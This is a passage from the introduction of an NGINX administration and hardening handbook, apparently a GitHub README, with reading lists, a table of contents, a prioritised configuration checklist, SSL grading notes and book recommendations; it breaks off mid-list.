HTTP and reverse proxy server, a mail proxy server, and a generic TCP/UDP proxy server with a strong focus on high concurrency, performance and low memory usage. It is originally written by Igor Sysoev. For a long time, it has been running on many heavily loaded Russian sites including Yandex, Mail.Ru, VK, and Rambler. At this moment some high-profile companies using NGINX include Cisco, DuckDuckGo, Facebook, GitLab, Google, Twitter, Apple, Intel, and many more. In the September 2019 it was the most commonly used HTTP server (see Netcraft survey). NGINX is a fast, light-weight and powerful web server that can also be used as a: fast HTTP reverse proxy reliable load balancer high performance caching server full-fledged web platform So, to be brief, it provides the core of complete web stacks and is designed to help build scalable web applications. When it comes to performance, NGINX can easily handle a huge amount of traffic. The other main advantage of the NGINX is that allows you to do the same thing in different ways. Unlike traditional HTTP servers, NGINX doesn't rely on threads to handle requests and it was written with a different architecture in mind - one which is much more suitable for nonlinear scalability in both the number of simultaneous connections and requests per second. NGINX is also known as a Apache Killer (mainly because of its lightness and much less RAM consumption). It is event-based, so it does not follow Apache's style of spawning new processes or threads for each web page request. Generally, it was created to solve the C10K problem. For me, it is a one of the best and most important service that I used in my SysAdmin career. These essential documents should be the main source of knowledge for you: Getting Started NGINX Documentation Development guide Security Controls In addition, I would like to recommend three great docs focuses on the concept of the HTTP protocol: HTTP Made Really Easy Hypertext Transfer Protocol Specification Web technology for developers - HTTP If you love security keep your eye on this one: Cryptology ePrint Archive. It provides access to recent research in cryptology and explores many subjects of security (e.g. Ciphers, Algorithms, SSL/TLS protocols). A great introduction that covers core concepts of cryptography is Practical Cryptography for Developers. I also recommend to read the Bulletproof SSL and TLS. Yep, it's definitely the most comprehensive book about deploying TLS for me. An obligatory source of knowledge is also the OWASP Cheat Sheet Series. You should ought treat it as an excellent security guidance. Burp Scanner - Issue Definitions introduces you to the web apps and security vulnerabilities. Finally, The Web Security Academy is a free online training center for web application security with high-quality reading materials and interactive labs of varying levels of difficulty. All are really good source to start learning about web application security. And, of course, always browse official Nginx Security Advisories and CVE databases like CVE Details or CVE - The MITRE Corporation - to stay Up-to-Date on NGINX vulnerabilities. Prologue When I was studying architecture of HTTP servers I became interested in NGINX. As I was going through research, I kept notes. I found a lot of information about it, e.g. forum posts on the web about every conceivable problem was great. However, I've never found one guide that covers the most important things in a suitable form. I was a little disappointed. I was interested in everything: NGINX internals, functions, security best practices, performance optimisations, tips & tricks, hacks and rules, but for me some of the documents treated the subject lightly. Of course, NGINX Official Documentation is the best place but I know that we also have other great resources: agentzh's Nginx Tutorials Nginx Guts Nginx discovery journey Nginx Secure Web Server Emillers Guide To Nginx Module Development Emillers Advanced Topics In Nginx Module Development These are definitely the best assets for us and in the first place you should seek help there. Moreover, in order to improve your knowledge, please see Books chapter - it contains top literature on NGINX. Why I created this handbook For me, however, there hasn't been a truly in-depth and reasonably simple cheatsheet which describe a variety of configurations and important cross-cutting topics for HTTP servers. Configuration of the NGINX can be tricky sometimes and you really need to get into the syntax and concepts to get an understanding tricks, loopholes, and mechanisms. The documentation isn't as pretty as other projects and should certainly include more robust examples. This handbook is a set of rules and recommendations for the NGINX Open Source HTTP server. It also contains the best practices, notes, and helpers with countless examples. Many of them refer to external resources. There are a lot of things you can do to improve in your NGINX instance and this guide will attempt to cover as many of them as possible. For the most part, it contains the most important things about NGINX for me. I think the configuration you provided should work without any talisman. That's why I created this repository. With this handbook you will explore the many features and capabilities of the NGINX. You'll find out, for example, how to testing the performance or how to resolve debugging problems. You will learn configuration guidelines, security design patterns, ways to handle common issues and how to stay out of them. I explained here a few best tips to avoid pitfalls and configuration mistakes. I added set of guidelines and examples has also been produced to help you administer of the NGINX. They give us insight into NGINX internals also. Mostly, I apply the rules presented here on the NGINX working as a reverse proxy. However, does not to prevent them being implemented for NGINX as a standalone server. Who this handbook is for If you do not have the time to read hundreds of articles (just like me) this multipurpose handbook may be useful. I created it in the hope that it will be useful especially for System Administrators and Experts of Web-based applications. This handbook does not get into all aspects of NGINX. What's more, some of the things described in this guide may be rather basic because most of us do not configure NGINX every day and it is easy to forget about basic/trivial things. On the other hand, also discusses heavyweight topics so there is something for advanced users. I tried to put external resources in many places in this handbook in order to dispel any suspicion that may exist. I did my best to make this handbook a single and consistent (but now I know that is really hard). It's organized in an order that makes logical sense to me. I think it can also be a good complement to official documentation and other great documents. Many of the topics described here can certainly be done better or different. Of course, I still have a lot to improve and to do. I hope you enjoy and have fun with it. Do not treat this handbook and notes written here as revealed knowledge. You should take a scientific approach when reading this document. If you have any doubts and disagree with me, please point out my mistakes. You should to discover cause and effect relationships by asking questions, carefully gathering and examining the evidence, and seeing if all the available information can be combined in to a logical answer. I create this handbook for one more reason. Rather than starting from scratch in, I putting together a plan for answering your questions to help you find the best way to do things and ensure that you don't repeat my mistakes from the past. So, what's most important: ask a questions about something that you observe do background research do tests with an experiments analyze and draw conclusions communicate results (for us!) Finally, you should know I'm not a NGINX expert but I love to know how stuff works and why work the way they do. Im not a crypto expert... but I do know the term \"elliptic curve\" (I really like this quote!). Don't need to be an expert to figure out the reason just got to have used this and not this or why something works this way and not another. It feels good to understand the recommendations and nuances of a topic youre passionate about. Before you start Remember about the following most important things: Blindly deploying of the rules described here can damage your web application! Do not follow guides just to get 100% of something. Think about what you actually do at your server! Copy-and-paste is not the best way to learn. Think twice before adopting rules from this handbook. There are no settings that are perfect for everyone. Always think about what is better and more important for you: security vs usability/compatibility. Security mainly refers to minimise the risk. Change one thing may open a whole new set of problems. Read about how things work and what values are considered secure enough (and for what purposes). The only correct approach is to understand your exposure, measure and tune. + Security is important for ethical reasons. Compliance is important for legal reasons. + The key to workplace contentment is understanding they are unrelated to each other. + Both are important, but one does not lead to the other (compliance != security). author: unknown + Security is always needed, no matter what type of website it is. It can be static HTML + or fully dynamic, an attacker can still inject hostile content into the page in transit + to attack the user. author: Scott Helme + Dont enable older deprecated protocols just because Karen in Florida is still using + a PC that she bought back in 2001. author: thisinterestsmeblog I think, in the age of phishing, cyber attacks, ransomware, etc., you should take care of security of your infrastructure as hard as possible but don't ever forget about this one... Lastly, I would like to quote two very important comments found on the web about compliance with the standards and regulations, and essence of a human factor in security: Regulations that make sense are often not descriptive - capturing the intent and scope of a rule often requires technical expertise. More than that, it's the type of expertise most organisations do not have. And instead of improving themselves, these companies, who may form the grand majority of the industry, petition the regulators to provide a safe checklist of technical mitigations that can be implemented to remain compliant. [...] Instead of doing the right thing and meeting the planned intent, companies are instead ticking nonsensical boxes that the regulators and their auditors demand. Blindly. Mindlessly. Divorced from reality. - by bostik Whenever considering security, the human factor is nearly always as important or more important than just the technical aspects. Policy and procedures need to consider the human element and try to ensure that these policies and procedures are structured in such a way as to help enable staff to do the right thing, even when they may not fully understand why they need to do it. - by Tim X Contributing & Support A real community, however, exists only when its members interact in a meaningful way that deepens their understanding of each other and leads to learning. If you find something which doesn't make sense, or something doesn't seem right, please make a pull request and please add valid and well-reasoned explanations about your changes or comments. Before adding a pull request, please see the contributing guidelines. Code Contributors This project exists thanks to all the people who contribute. ToDo What needs to be done? Look at the following ToDo list: New chapters: Bonus Stuff HTTP Basics SSL/TLS Basics Reverse Proxy Caching Core modules 3rd party modules Web Application Firewall ModSecurity Debugging Existing chapters: Introduction Prologue Why I created this handbook Who this handbook is for Before you start Contributing & Support _RSS Feed & Updates Checklist to rule them all Bonus Stuff Fully automatic installation Static error pages generator Server names parser Books ModSecurity 3.0 and NGINX: Quick Start Guide Cisco ACE to NGINX: Migration Guide External Resources Nginx official Nginx Forum Nginx Mailing List NGINX-Demos Presentations & Videos NGINX: Basics and Best Practices NGINX Installation and Tuning Nginx Internals (by Joshua Zhu) Nginx internals (by Liqiang Xu) How to secure your web applications with NGINX Tuning TCP and NGINX on EC2 Extending functionality in nginx, with modules! Nginx - Tips and Tricks. Nginx Scripting - Extending Nginx Functionalities with Lua How to handle over 1,200,000 HTTPS Reqs/Min Using ngx_lua / lua-nginx-module in pixiv Cheatsheets & References Nginx configurations for most popular CMS/CMF/Frameworks based on PHP Performance & Hardening Memorable site for testing clients against bad SSL configs Config parsers Quick and reliable way to convert NGINX configurations into JSON and back Parses nginx configuration with Pyparsing Config managers Ansible role to install and manage nginx configuration Ansible Role - Nginx Ansible role for NGINX Puppet Module to manage NGINX on various UNIXes Static analyzers nginx-minify-conf Comparison reviews NGINX vs. Apache (Pro/Con Review, Uses, & Hosting for Each) Web cache server performance benchmark: nuster vs nginx vs varnish vs squid Builder tools Nginx-builder Benchmarking tools wrk2 httperf slowloris slowhttptest GoldenEye Debugging tools strace GDB SystemTap stapxx htrace.sh Security & Web testing tools Burp Suite w3af nikto ssllabs-scan http-observatory testssl.sh sslyze cipherscan O-Saft Nghttp2 h2spec http2fuzz Arjun Corsy XSStrike Online & Web tools ssltools Other stuff OWASP Cheat Sheet Series Mozilla Web Security Application Security Wiki OWASP ASVS 4.0 The System Design Primer awesome-scalability Web Architecture 101 HTTP Basics Features and architecture HTTP/2 How to debug HTTP/2? HTTP/3 URI vs URL Connection vs request HTTP Headers Header compression HTTP Methods Request Request line Methods Request URI HTTP version Request header fields Message body Generate requests Response Status line HTTP version Status codes and reason phrase Response header fields Message body HTTP client IP address shortcuts Back-End web architecture Useful video resources SSL/TLS Basics TLS versions TLS handshake In which layer is TLS situated within the TCP/IP stack? RSA and ECC keys/certificates Cipher suites Authenticated encryption (AEAD) cipher suites Why cipher suites are important? NGINX and TLS 1.3 Cipher Suites Diffie-Hellman key exchange Certificates Chain of Trust What is the main purpose of the Intermediate CA? Single-domain Multi-domain Wildcard Wildcard SSL doesn't handle root domain? TLS Server Name Indication Verify your SSL, TLS & Ciphers implementation Useful video resources NGINX Basics Processes CPU pinning Shutdown of worker processes Configuration syntax Comments End of lines Variables, Strings, and Quotes Directives, Blocks, and Contexts External files Measurement units Regular expressions with PCRE Enable syntax highlighting Connection processing Event-Driven architecture Multiple processes Simultaneous connections HTTP Keep-Alive connections sendfile, tcp_nodelay, and tcp_nopush Server blocks logic Matching location if in location Nested locations rewrite vs return try_files directive if, break and set root vs alias internal directive External and internal redirects allow and deny uri vs request_uri Compression and decompression What is the best NGINX compression gzip level? Hash tables Server names hash table Log files Conditional logging Manually log rotation NGINX upstream variables returns 2 values Reverse proxy Passing requests Trailing slashes Processing headers Passing headers Importance of the Host header Redirects and X-Forwarded-Proto A warning about the X-Forwarded-For Improve extensibility with Forwarded Response headers Load balancing algorithms Backend parameters Upstream servers with SSL Round Robin Weighted Round Robin Least Connections Weighted Least Connections IP Hash Generic Hash Fair module Other methods Rate Limiting Variables Directives, keys, and zones Burst and nodelay parameters NAXSI Web Application Firewall OWASP ModSecurity Core Rule Set (CRS) Other subjects Secure Distribution of SSL Private Keys with NGINX Core modules ngx_http_geo_module 3rd party modules ngx_set_misc ngx_http_geoip_module Helpers Installing from source Automatic installation on RHEL/Debian/BSD Compiler and linker Debugging Symbols SystemTap stapxx Separation and improvement of installation methods Installation Nginx on CentOS 7 Installation OpenResty on CentOS 7 Installation Tengine on Ubuntu 18.04 Installation Nginx on FreeBSD 11.3 Installation Nginx on FreeBSD 11.3 (from ports) Monitoring CollectD, Prometheus, and Grafana nginx-vts-exporter CollectD, InfluxDB, and Grafana Telegraf, InfluxDB, and Grafana Testing Build OpenSSL 1.0.2-chacha version Send request and show response headers Send request with http method, user-agent, follow redirects and show response headers Send multiple requests Testing SSL connection Testing SSL connection (debug mode) Testing SSL connection with SNI support Testing SSL connection with specific SSL version Testing SSL connection with specific cipher Verify 0-RTT Testing SCSV Load testing with ApacheBench (ab) Standard test Test with Keep-Alive header Load testing with wrk2 Standard scenarios POST call (with Lua) Random paths (with Lua) Multiple paths (with Lua) Random server address to each thread (with Lua) Multiple json requests (with Lua) Debug mode (with Lua) Analyse data pass to and from the threads Parsing wrk result and generate report Load testing with locust Multiple paths Multiple paths with different user sessions TCP SYN flood Denial of Service attack HTTP Denial of Service attack Debugging Show information about processes Check memory usage Show open files Check segmentation fault messages Dump configuration Get the list of configure arguments Check if the module has been compiled Show the most accessed IP addresses (ip and url) Show the most requested urls with http methods Show the most accessed response codes Calculating requests per second with IP addresses and urls Check that the gzip_static module is working Which worker processing current request Capture only http packets Extract User Agent from the http packets Capture only http GET and POST packets Capture requests and filter by source ip and destination port Capture HTTP requests/responses in real time, filter by GET, HEAD and save to a file Server Side Include (SSI) debugging Dump a process's memory GNU Debugger (gdb) Dump configuration from a running process Show debug log in memory Core dump backtrace Debugging socket leaks SystemTap cheatsheet stapxx Errors & Issues Common errors Configuration snippets Nginx server header removal Custom log formats Log only 4xx/5xx Restricting access with client certificate Restricting access by geographical location GeoIP 2 database Custom error pages Dynamic error pages with SSI Limiting the rate of requests per IP with geo and map Using trailing slashes Properly redirect all HTTP requests to HTTPS Adding and removing the www prefix Proxy/rewrite and keep the original URL Proxy/rewrite and keep the part of original URL Proxy/rewrite without changing the original URL (in browser) Modify 301/302 response body Redirect POST request with payload to external endpoint Route to different backends based on HTTP method Redirect users with certain IP to special location Allow multiple cross-domains using the CORS headers Set correct scheme passed in X-Forwarded-Proto Securing URLs with the Secure Link Module Tips and methods for high load traffic testing (cheatsheet) Location matching examples Passing requests to the backend The HTTP backend server The uWSGI backend server The FastCGI backend server The memcached backend server The Redis backend server HTTPS traffic to upstream servers TCP and UDP load balancing Lua snippets nginscripts snippets Other snippets Recreate base directory Create a temporary static backend Create a temporary static backend with SSL support Generate password file with htpasswd command Generate private key without passphrase Generate private key with passphrase Remove passphrase from private key Encrypt existing private key with a passphrase Generate CSR Generate CSR (metadata from existing certificate) Generate CSR with -config param Generate private key and CSR List available EC curves Generate ECDSA private key Generate private key and CSR (ECC) Generate self-signed certificate Generate self-signed certificate from existing private key Generate self-signed certificate from existing private key and csr Generate multidomain certificate (Certbot) Generate wildcard certificate (Certbot) Generate certificate with 4096 bit private key (Certbot) Generate DH public parameters Display DH public parameters Extract certs from p7b Convert DER to PEM Convert PEM to DER Verification of the certificate's supported purposes Verification of the private key Check private key Get public key from private key Verification of the public key Verification of the certificate Verification of the CSR Check the private key and the certificate are match TLSv1.3 and CCM ciphers Base Rules Format, prettify and indent your Nginx code Never use a hostname in a listen or upstream directives Set the HTTP headers with add_header and proxy*header directives properly Making a rewrite absolute (with scheme) Use return directive for URL redirection (301, 302) Use simple custom error pages Configure log rotation policy Don't duplicate index directive, use it only in the http block Debugging Improve debugging by disable daemon, master process, and all workers except one Use core dumps to figure out why NGINX keep crashing Use mirror module to copy requests to another backend Dynamic debugging with echo module Dynamic debugging with SSI Performance Enable OCSP Stapling Avoid multiple index directives Use $request_uri to avoid using regular expressions Use try_files directive to ensure a file exists Don't pass all requests to the backend - use try_files Use return directive instead of rewrite for redirects Enable PCRE JIT to speed up processing of regular expressions Set proxy timeouts for normal load and under heavy load Configure kernel parameters for high load traffic Activate the cache for connections to upstream servers Hardening Keep NGINX up-to-date Take care about your ACL rules Use only the latest supported OpenSSL version Remove support for legacy and risky HTTP request headers Prevent Replay Attacks on Zero Round-Trip Time Prevent caching of sensitive data Limit concurrent connections Set properly files and directories permissions (also with acls) on a paths Implement HTTPOnly and secure attributes on cookies Reverse Proxy Use pass directive compatible with backend protocol Be careful with trailing slashes in proxy_pass directive Set and pass Host header only with $host variable Set properly values of the X-Forwarded-For header Don't use X-Forwarded-Proto with $scheme behind reverse proxy Always pass Host, X-Real-IP, and X-Forwarded headers to the backend Use custom headers without X- prefix Always use $request_uri instead of $uri in proxy_pass Set proxy buffers and timeouts Others Set the certificate chain correctly Define security policies with security.txt Use tcpdump to diagnose and troubleshoot the HTTP issues If you have any idea, send it back to me or add a pull request. RSS Feed & Updates GitHub exposes an RSS/Atom feed of the commits, which may also be useful if you want to be kept informed about all changes. Checklist to rule them all This checklist was the primary aim of the nginx-admins-handbook. It contains a set of best practices and recommendations on how to configure and maintain the NGINX properly. This checklist contains all rules (79) from this handbook. Generally, I think that each of these principles is important and should be considered. I separated them into four levels of priority to help guide your decision. PRIORITY NAME AMOUNT DESCRIPTION critical 33 definitely use this rule, otherwise it will introduce high risks of your NGINX security, performance, and other major 26 it's also very important but not critical, and should still be addressed at the earliest possible opportunity normal 12 there is no need to implement but it is worth considering because it can improve the NGINX working and functions minor 8 as an option to implement or use (not required) Remember, these are only guidelines. My point of view may be different from yours so if you feel these priority levels do not reflect your configurations commitment to security, performance or whatever else, you should adjust them as you see fit. RULE CHAPTER PRIORITY Define the listen directives with address:port pairPrevents soft mistakes which may be difficult to debug. Base Rules Prevent processing requests with undefined server namesIt protects against configuration errors, e.g. traffic forwarding to incorrect backends. Base Rules Never use a hostname in a listen or upstream directivesWhile this may work, it will comes with a large number of issues. Base Rules Set the HTTP headers with add_header and proxy_*_header directives properlySet the right security headers for all contexts. Base Rules Configure log rotation policySave yourself trouble with your web server: configure appropriate logging policy. Base Rules Use simple custom error pagesDefault error pages reveals information which leads to information leakage vulnerability. Base Rules Use HTTP/2HTTP/2 will make our applications faster, simpler, and more robust. Performance Always keep NGINX up-to-dateUse newest NGINX package to fix vulnerabilities, bugs, and to use new features. Hardening Run as an unprivileged userUse the principle of least privilege. This way only master process runs as root. Hardening Protect sensitive resourcesHidden directories and files should never be web accessible. Hardening Take care about your ACL rulesTest your access-control lists and to stay secure. Hardening Hide upstream proxy headersDon't expose what version of software is running on the server. Hardening Remove support for legacy and risky HTTP request headersSupports for the offending headers should be removed. Hardening Force all connections over TLSProtects your website for handle sensitive communications. Hardening Use min. 2048-bit for RSA and 256-bit for ECC2048 bit (RSA) or 256 bit (ECC) keys are sufficient for commercial use. Hardening Keep only TLS 1.3 and TLS 1.2Use TLS with modern cryptographic algorithms and without protocol weaknesses. Hardening Use only strong ciphersUse only strong and not vulnerable cipher suites. Hardening Use more secure ECDH CurveUse ECDH Curves with according to NIST recommendations. Hardening Use strong Key Exchange with Perfect Forward SecrecyEstablishes a shared secret between two parties that can be used for secret communication. Hardening Defend against the BEAST attackThe server ciphers should be preferred over the client ciphers. Hardening Enable HTTP Strict Transport SecurityTells browsers that it should only be accessed using HTTPS, instead of using HTTP. Hardening Reduce XSS risks (Content-Security-Policy)CSP is best used as defence-in-depth. It reduces the harm that a malicious injection can cause. Hardening Control the behaviour of the Referer header (Referrer-Policy)The default behaviour of referrer leaking puts websites at risk of privacy and security breaches. Hardening Provide clickjacking protection (X-Frame-Options)Defends against clickjacking attack. Hardening Prevent some categories of XSS attacks (X-XSS-Protection)Prevents to render pages if a potential XSS reflection attack is detected. Hardening Prevent Sniff Mimetype middleware (X-Content-Type-Options)Tells browsers not to sniff MIME types. Hardening Reject unsafe HTTP methodsOnly allow the HTTP methods for which you, in fact, provide services. Hardening Prevent caching of sensitive dataIt helps to prevent critical data (e.g. credit card details, or username) leaked. Hardening Limit concurrent connectionsLimit concurrent connections to prevent a rogue guys from repeatedly connecting to and monopolizing NGINX. Hardening Use pass directive compatible with backend protocolSet pass directive only to working with compatible backend layer protocol. Reverse Proxy Set properly values of the X-Forwarded-For headerIdentify clients communicating with servers located behind the proxy. Reverse Proxy Don't use X-Forwarded-Proto with $scheme behind reverse proxyPrevent pass incorrect value of this header. Reverse Proxy Always use $request_uri instead of $uri in proxy_passYou should always pass unchanged URI to the backend layer. Reverse Proxy Organising Nginx configurationWell organised code is easier to understand and maintain. Base Rules Format, prettify and indent your Nginx codeFormatted code is easier to maintain, debug, and can be read and understood in a short amount of time. Base Rules Use reload option to change configurations on the flyGraceful reload of the configuration without stopping the server and dropping any packets. Base Rules Use return directive for URL redirection (301, 302)The by far simplest and fastest because there is no regexp that has to be evaluated. Base Rules Maintaining SSL sessionsImproves performance from the clients perspective. Performance Enable OCSP StaplingEnable to reduce the cost of an OCSP validation. Performance Use exact names in a server_name directive if possibleHelps speed up searching using exact names. Performance Avoid checks server_name with if directiveIt decreases NGINX processing requirements. Performance Use $request_uri to avoid using regular expressionsBy default, the regex is costly and will slow down the performance. Performance Use try_files directive to ensure a file existsUse it if you need to search for a file, it saving duplication of code also. Performance Use return directive instead of rewrite for redirectsUse return directive to more speedy response than rewrite. Performance Enable PCRE JIT to speed up processing of regular expressionsNGINX with PCRE JIT is much faster than without it. Performance Activate the cache for connections to upstream servers Nginx can now reuse its existing connections (keepalive) per upstream. Performance Disable unnecessary modulesLimits vulnerabilities, improve performance and memory efficiency. Hardening Hide Nginx version numberDon't disclose sensitive information about NGINX. Hardening Hide Nginx server signatureDon't disclose sensitive information about NGINX. Hardening Use only the latest supported OpenSSL versionStay protected from SSL security threats and don't miss out of new features. Hardening Prevent Replay Attacks on Zero Round-Trip Time0-RTT is disabled by default but you should know that enabling this option creates a significant security risks. Hardening Mitigation of CRIME/BREACH attacksDisable HTTP compression or compress only zero sensitive content. Hardening Deny the use of browser features (Feature-Policy)A mechanism to allow and deny the use of browser features. Hardening Control Buffer Overflow attacksPrevents errors are characterised by the overwriting of memory fragments of the NGINX process. Hardening Mitigating Slow HTTP DoS attacks (Closing Slow Connections)Prevents attacks in which the attacker sends HTTP requests in pieces slowly. Hardening Set and pass Host header only with $host variableUse of the $host is the only one guaranteed to have something sensible. Reverse Proxy Always pass Host, X-Real-IP, and X-Forwarded headers to the backendIt gives you more control of forwarded headers. Reverse Proxy Set the certificate chain correctlySend the complete chain to the client. Others Enable DNS CAA PolicyAllows domain name holders to indicate to CA whether they are authorized to issue digital certificates. Others Separate listen directives for 80 and 443 portsHelp you maintain and modify your configuration. Base Rules Use only one SSL config for the listen directivePrevents multiple configurations on the same listening address. Base Rules Use geo/map modules instead of allow/denyProvides the perfect way to block invalid visitors. Base Rules Set global root directory for unmatched locationsSpecifies the root directory for an undefined locations. Base Rules Don't duplicate index directive, use it only in the http blockWatch out for duplicating the same rules. Base Rules Adjust worker processesYou can adjust this value to maximum throughput under high concurrency. Performance Make an exact location match to speed up the selection processExact location matches are often used to speed up the selection process. Performance Use limit_conn to improve limiting the download speedLimits NGINX download speed per connection. Performance Be careful with trailing slashes in proxy_pass directiveIncorrect setting could end up with some strange url. Reverse Proxy Use custom headers without X- prefixThe use of custom headers with X- prefix is discouraged. Reverse Proxy Tweak passive health checksImprove behaviour of the passive health checks. Load Balancing Define security policies with security.txtHelps make things easier for companies and security researchers. Others Map all the things...Map module provides a more elegant solution for clearly parsing a big list of regexes. Base Rules Use custom log formatsThis is extremely helpful for debugging specific location directives. Debugging Use debug mode to track down unexpected behaviourThere's probably more detail than you want, but that can sometimes be a lifesaver. Debugging Improve debugging by disable daemon, master process, and all workers except oneThis simplifies the debugging and lets test configurations rapidly. Debugging Use core dumps to figure out why NGINX keep crashingEnable core dumps when your NGINX instance receive an unexpected error or when it crashed. Debugging Use mirror module to copy requests to another backendUse mirroring for investigation and debugging of any original request. Debugging Don't disable backends by comments, use down parameterIs a good solution to marks the server as permanently unavailable. Load Balancing Use tcpdump to diagnose and troubleshoot the HTTP issuesUse tcpdump to monitor HTTP. Others Bonus Stuff You can find here a few of the different things I've worked and included to this repository. I hope that these extras will be useful. Configuration reports Many of these recipes have been applied to the configuration of my old private website. An example configuration is in the configuration examples chapter. It's also based on this version of printable high-res hardening cheatsheets. SSL Labs Read about SSL Labs grading here (SSL Labs Grading 2018). Short SSL Labs grades explanation: A+ is clearly the desired grade, both A and B grades are acceptable and result in adequate commercial security. The B grade, in particular, may be applied to configurations designed to support very wide audiences (for old clients). I finally got A+ grade and following scores: Certificate = 100% Protocol Support = 100% Key Exchange = 90% Cipher Strength = 90% Look also at the following recommendations. I believe the right configuration of NGINX should give the following SSL Labs scores and provides the best security for the most cases: Recommended A/A+ Certificate: 100/100 Protocol Support: 95/100 Key Exchange: 90/100 Cipher Strength: 90/100 Perfect but restrictive A+ Certificate: 100/100 Protocol Support: 100/100 Key Exchange: 100/100 Cipher Strength: 100/100 Something about SSL Labs grading mechanism (that's an interesting point of view): The whole grading mechanism is more propaganda and public relations than actual security. If you want good security, then you must mind the details and understand how things work internally. If you want a good grade then you should do whatever it takes to have a good grade. An \"A+\" from SSL Labs is a very nifty thing to add at the end of a report, but it does not really equate with having rock solid security. Having an \"A+\" equates with being able to say \"I have an A+\". - from this answer by Tom Leek. Mozilla Observatory Read about Mozilla Observatory here and about Observatory Scoring Methodology. I also got the highest summary note (A+) on the Observatory with a very high test score (120/100, max. 135/100): Printable hardening cheatsheets I created two versions of printable posters with hardening cheatsheets (High-Res 5000x8800) based on recipes from this handbook: For xcf and pdf formats please see this directory. A+ with all 100%s on @ssllabs and 120/100 on @mozilla observatory: It provides the highest scores of the SSL Labs test. Setup is very restrictive with 4096-bit private key, only TLS 1.2, and also modern strict TLS cipher suites (non 128-bits). Think carefully about its use (no TLS 1.3, restrictive cipher suites), in my opinion, it is only suitable for obtaining the highest possible rating and seems a little impractical. A+ on @ssllabs and 120/100 on @mozilla observatory with TLS 1.3 support: It provides less restrictive setup with 2048-bit key for RSA or 256-bit key for ECC, TLS 1.3 and 1.2, modern strict TLS cipher suites (128/256-bits), and 2048-bit predefined DH groups recommended by Mozilla. The final grade is also in line with the industry standards and guidance. Recommend using this, for me, it is very reasonable configuration. Fully automatic installation I created a set of scripts for unattended installation of NGINX from the raw, uncompiled code. It allows you to easily install, create a setup for dependencies (like zlib or openssl), and customized with installation parameters. For more information please see Installing from source - Automatic installation chapter which describes the installation of NGINX on systems/distros such as Ubuntu, Debian, CentOS, and FreeBSD. Static error pages generator I created a simple to use generator for static pages to replace the default error pages that comes with any web server like NGINX. For more information please see HTTP Static Error Pages Generator. Server names parser I added scripts for fast multiple domain searching in the configuration. These tools get specific server_name matches and print them on the screen as a server { ... } blocks. Both are very helpful if you really have tons of domains or if you want to list specific vhosts from file or the active configuration. You must follow one important rule to be able to use it. Your server block must have the following structure: server { server_name example.com example.org; ... # other directives } Example of use: ./snippets/server-name-parser/check-server-name.sh example.com Searching 'example.com' in '/usr/local/etc/nginx' (from disk) /usr/local/etc/nginx/domains/example.com/servers.conf:79: return 301 https://example.com$request_uri; /usr/local/etc/nginx/domains/example.com/servers.conf:252: return 301 https://example.com$request_uri; /usr/local/etc/nginx/domains/example.com/servers.conf:3825: server_name example.com; Searching 'example.com' in server contexts (from a running process) >>>>>>>>>> BEG >>>>>>>>>> server { include listen/192.168.252.10/https.example.com.conf; server_name example.com; location / { return 204 \"RFC 792\"; } access_log /var/log/nginx/example.com/access.log standard; error_log /var/log/nginx/example.com/error.log warn; } <<<<<<<<<< END <<<<<<<<<< For more information please see snippets/server-name-parser directory. Books Nginx Essentials Authors: Valery Kholodkov Excel in Nginx quickly by learning to use its most essential features in real-life applications. Learn how to set up, configure, and operate an Nginx installation for day-to-day use Explore the vast features of Nginx to manage it like a pro, and use them successfully to run your website Example-based guide to get the best out of Nginx to reduce resource usage footprint This short review comes from this book or the store. Nginx Cookbook Authors: Derek DeJonghe Youll find recipes for: Traffic management and A/B testing Managing programmability and automation with dynamic templating and the NGINX Plus API Securing access through encrypted traffic, secure links, HTTP authentication subrequests, and more Deploying NGINX to AWS, Azure, and Google cloud-computing services Using Docker to deploy containers and microservices Debugging and troubleshooting, performance tuning, and practical ops tips This short review comes from this book or the store. Nginx HTTP Server Authors: Martin Fjordvald, Clement Nedelcu Harness the power of Nginx to make the most of your infrastructure and serve pages faster than ever. Discover possible interactions between Nginx and Apache to get the best of both worlds Learn to exploit the features offered by Nginx for your web applications Get your hands on the most updated version of Nginx (1.13.2) to support all your web administration requirements This short review comes from this book or the store. Nginx High Performance Authors: Rahul Sharma Optimize NGINX for high-performance, scalable web applications. Configure Nginx for best performance, with configuration examples and explanations Step-by-step tutorials for performance testing using open source software Tune the TCP stack to make the most of the available infrastructure This short review comes from this book or the store. Mastering Nginx Authors: Dimitri Aivaliotis Written for experienced systems administrators and engineers, this book teaches you from scratch how to configure Nginx for any situation. Step-by-step instructions and real-world code snippets clarify even the most complex areas. This short review comes from this book or the store. ModSecurity 3.0 and NGINX: Quick Start Guide Authors: Faisal Memon, Owen Garrett, Michael Pleshakov Learn in this ebook how to get started with ModSecurity, the worlds most widely deployed web application firewall (WAF), now available for NGINX and NGINX Plus. This short review comes from this book or the store. Cisco ACE to NGINX: Migration Guide Authors: Faisal Memon This ebook provides step-by-step instructions on replacing Cisco ACE with NGINX and off-the-shelf servers. NGINX helps you cut costs and modernize. In this ebook you will learn: How to migrate Cisco ACE configuration to NGINX, with detailed examples Why you should go with a software load balancer, and not hardware This short review comes from this book or the store. External Resources Nginx official Nginx Project Nginx Documentation Nginx Wiki Nginx Admin's Guide Nginx Pitfalls and Common Mistakes Development Guide Nginx Forum Nginx Security Advisories Nginx Security Controls Nginx Mailing List Nginx Read-only Mirror NGINX-Demos Thread Pools in NGINX Boost Performance 9x! Nginx distributions OpenResty The Tengine Web Server Comparison reviews NGINX vs. Apache (Pro/Con Review, Uses, & Hosting for Each) Web cache server performance benchmark: nuster vs nginx vs varnish vs squid Cheatsheets & References agentzh's Nginx Tutorials Introduction to nginx.conf scripting Nginx discovery journey Nginx Guts Nginx Cheatsheet Nginx Tutorials, Linux Sysadmin Configuration & Optimizing Tips and Tricks Nginx boilerplate configs Awesome Nginx configuration template Nginx Quick Reference A collection of resources covering Nginx and more A collection of useful Nginx configuration snippets Nginx configurations for most popular CMS/CMF/Frameworks based on PHP Boilerplate configuration for nginx and certbot with docker-compose Performance & Hardening Nginx Tuning For Best Performance by Denji Nginx Optimization: understanding sendfile, tcp_nodelay and tcp_nopush How we scaled nginx and saved the world 54 years every day TLS has exactly one performance problem: it is not used widely enough SSL/TLS Deployment Best Practices SSL Server Rating Guide SSL Pulse How to Build a Tough NGINX Server in 15 Steps Top 25 Nginx Web Server Best Security Practices Nginx Secure Web Server Strong SSL Security on Nginx Enable cross-origin resource sharing (CORS) NAXSI - WAF for Nginx ModSecurity for Nginx Presentations & Videos NGINX: Basics and Best Practices NGINX Installation and Tuning Nginx Internals (by Joshua Zhu) Nginx internals (by Liqiang Xu) How to 